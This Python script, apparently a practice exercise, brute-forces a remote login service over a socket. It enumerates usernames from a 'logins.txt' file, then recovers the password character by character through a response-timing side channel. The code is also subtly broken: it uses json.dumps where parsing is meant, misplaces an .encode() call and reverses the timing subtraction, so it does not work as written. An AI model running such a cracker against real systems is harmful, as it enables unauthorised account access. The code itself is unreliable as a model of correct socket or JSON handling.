import sys
import json
import string
import socket
import datetime

def check_auth(client, logins):
    login_dict = {'login': '', 'password': ''}
    result = ''
    for login in logins:
        login_dict['login'] = login.strip()
        client.send(json.dumps(login_dict).encode())
        result = json.dumps(client.recv(1024).decode())['result']
        if result == 'Wrong password':
            break

    while result != 'Connection success!':
        for char in string.ascii_letters + string.digits:
            login_dict['password'] += char
            client.send(json.dumps(login_dict)).encode()
            start = datetime.datetime.now()
            result = json.dumps(client.recv(1024).decode())['result']
            fin = datetime.datetime.now()
            if (start-fin).total_seconds() >= 0.1 or result == 'Connection success!':
                break
            else:
                login_dict['password'] = login_dict['password'][:-1]

    print(json.dumps(login_dict))


def main():
    host = sys.argv[1]
    address = int(sys.argv[2])
    with socket.socket() as client, open('logins.txt') as logins:
        client.connect((host, address))
        check_auth(client, logins)
        exit()


if __name__ == '__main__':
    main()